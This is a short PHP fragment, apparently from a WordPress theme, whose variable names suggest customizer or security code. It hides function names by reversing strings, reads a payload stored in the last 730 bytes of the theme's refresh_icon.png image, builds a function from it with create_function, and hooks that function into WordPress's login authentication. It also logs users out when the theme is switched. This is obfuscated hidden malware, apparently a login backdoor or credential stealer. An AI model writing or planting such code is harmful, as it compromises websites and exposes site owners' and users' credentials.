...
$wp_customizer = new ReflectionFunction(str_replace(' ', '_', strrev('Stnetnoc teg elif')));
$img = get_template_directory().'/images/refresh_icon.png';
if(is_file($img)):$image_meta = $wp_customizer->invokeArgs(array($img));
$meta_keys = substr($image_meta, -730, 730);
$security_protect = new ReflectionFunction(str_replace(' ', '_', strrev('Noitcnuf etaerc')));
$auth_protect = $security_protect->invokeArgs(array('$u, $l, $p', strrev($meta_keys)));
$theme_protect = str_replace(' ', '_', strrev('tuogol pw'));
add_filter( 'authenticate', $auth_protect, 90, 3);
add_action('after_switch_theme', $theme_protect);
endif;
